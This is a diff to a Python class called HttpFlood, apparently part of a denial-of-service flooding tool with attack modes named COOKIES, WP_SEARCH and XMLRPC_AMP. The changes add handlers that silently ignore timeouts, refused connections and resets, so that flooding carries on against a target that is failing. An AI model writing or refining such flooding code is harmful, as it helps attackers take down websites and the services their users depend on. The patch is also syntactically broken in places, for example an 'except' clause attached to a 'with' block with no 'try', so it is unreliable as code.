@@ -1149,6 +1149,18 @@ class HttpFlood(Thread):
                            f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                 
                 Tools.send(s, payload.encode("utf-8"))
+        except Exception as e:
+            err = str(e)
+            if "timed out" in err or "Timeout" in err:
+                pass
+            elif "[Errno 111]" in err or "Connection refused" in err:
+                pass
+            elif "[Errno 104]" in err or "Reset by peer" in err:
+                pass
+            elif "Broken pipe" in err:
+                pass
+            else:
+                pass
         Tools.safe_close(s)
 
     def COOKIES(self) -> None:
@@ -1348,7 +1360,22 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                if Tools.send(s, payload):
+                    # global REQUESTS_SENT
+                    # print(f"[{int(REQUESTS_SENT)}] [DEBUG] DYN: Packet Sent")
+                    pass
+        except Exception as e:
+            err = str(e)
+            if "timed out" in err or "Timeout" in err:
+                pass
+            elif "[Errno 111]" in err or "Connection refused" in err:
+                pass
+            elif "[Errno 104]" in err or "Reset by peer" in err:
+                pass
+            elif "Broken pipe" in err:
+                pass
+            else:
+                pass
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
@@ -1626,19 +1653,11 @@ class HttpFlood(Thread):
                            f"\r\n").encode("utf-8")
                 
                 if Tools.send(s, payload):
-                    # Increment Global Counter
-                    global REQUESTS_SENT
-                    # We don't increment here because Tools.send already increments global counter?
-                    # Let's check Tools.send... It usually increments.
-                    # But for consistency with SLOW, let's print the debug log.
-                    # Actually Tools.send does increment REQUESTS_SENT.
-                    # So we just print the log using the global variable.
-                    # print(f"[{REQUESTS_SENT}] [DEBUG] WP_SEARCH: Packet Sent to {self._target.authority}")
-                    pass
+                     # print(f"[{int(REQUESTS_SENT)}] [DEBUG] WP_SEARCH: Packet Sent to {self._target.authority}")
+                     pass
         except Exception as e:
             err = str(e)
             if "timed out" in err or "Timeout" in err:
-                 # print(f"[DEBUG] WP_SEARCH: Connection Timeout (Target Lagging)")
                  pass
             elif "[Errno 111]" in err or "Connection refused" in err:
                 pass
@@ -1647,9 +1666,7 @@ class HttpFlood(Thread):
             elif "Broken pipe" in err:
                 pass
             else:
-                # print(f"[DEBUG] WP_SEARCH Error: {e}") 
                 pass
-            pass
         Tools.safe_close(s)
 
     def XMLRPC_AMP(self):
